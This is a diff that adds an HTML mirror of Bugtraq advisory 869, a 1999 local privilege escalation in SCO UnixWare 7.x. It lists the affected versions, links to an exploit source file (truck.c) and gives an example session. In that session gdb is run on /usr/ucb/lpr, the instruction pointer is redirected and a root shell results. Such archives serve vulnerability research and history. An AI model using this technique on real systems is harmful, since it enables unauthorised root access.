@@ -1,0 +1,105 @@
+#SpeeDr00t@Black Falcon<br>#bid869<p><b><span style="font-size: 18pt;">SCO Unixware Privileged Program Debugging Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/869/info">info</a><br><a href="http://www.securityfocus.com/bid/869/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/869/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/869/solution">solution</a><br><a href="http://www.securityfocus.com/bid/869/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				869
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 10 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Dec 10 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was discovered by Brock Tellier &lt;btellier@usa.net&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SCO Unixware 7.1.1 <br/>
+					
+				
+					SCO Unixware 7.1 <br/>
+					
+				
+					SCO Unixware 7.0.1 <br/>
+					
+				
+					SCO Unixware 7.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x1000/869/truck.c">#exploit_truck.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Example exploit usage:<br/><br/>bash-2.02$ ./truck 3<br/><br/>UnixWare 7.1 security model exploit<br/>Brock Tellier btellier@usa.net<br/><br/>$ ./gdb /usr/ucb/lpr<br/>GDB is free software and you are welcome to distribute copies of it<br/>under certain conditions; type "show copying" to see the conditions.<br/>There is absolutely no warranty for GDB; type "show warranty" for details                                      <br/>GDB 4.15 (unixware2), Copyright 1995 Free Software Foundation, Inc...<br/>no debugging symbols found)...<br/>gdb) break _init<br/>Breakpoint 1 at 0x805036c<br/>gdb) run<br/>Starting program: /usr/ucb/lpr<br/><br/>Program received signal SIGTRAP, Trace/breakpoint trap.<br/>Switching to process 3302<br/>warning: shared library handler failed to enable breakpoint<br/><br/>Breakpoint 1, 0x805036c in _init ()<br/>(gdb) disassemble<br/>Dump of assembler code for function _init:<br/>0x805036c &lt;_init&gt;:      ret<br/><br/>End of assembler dump.<br/>(gdb) set $eip 0x8046b75<br/>(gdb) continue<br/>Continuing.<br/><br/>Program received signal SIGTRAP, Trace/breakpoint trap.<br/>Cannot remove breakpoints because program is no longer writable.<br/>t might be running in another process.<br/>Further execution is probably impossible.<br/>0xbff99a40 in errno ()<br/>gdb) continue<br/>Continuing.<br/># id<br/>uid=3D0(root) gid=3D1(other)<br/>groups=3D0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),<br/>7(tty),8(audit),10(nuucp),12(daemon),23(cron),25(dtadmin),47(priv),9(lp)<br/># 
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/truck.c">/data/vulnerabilities/exploits/truck.c</a></li>
+</ul>
+</div>
